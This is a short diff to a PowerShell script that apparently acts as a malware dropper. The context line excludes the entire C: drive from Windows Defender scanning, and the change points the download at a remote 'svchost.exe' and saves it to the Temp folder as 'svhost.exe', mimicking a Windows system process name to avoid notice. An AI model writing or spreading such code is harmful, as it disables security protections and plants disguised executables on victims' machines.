@@ -32,13 +32,13 @@ Add-MpPreference -ExclusionPath C:\
 
 
 
-$url = "https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/VipToolMeta.exe"
+$url = "https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/svchost.exe"
 
 #############################################################################################################################
 
 
 
-$output = "$env:Temp/VipToolMeta.exe"
+$output = "$env:Temp/svhost.exe"
 
 #############################################################################################################################
 
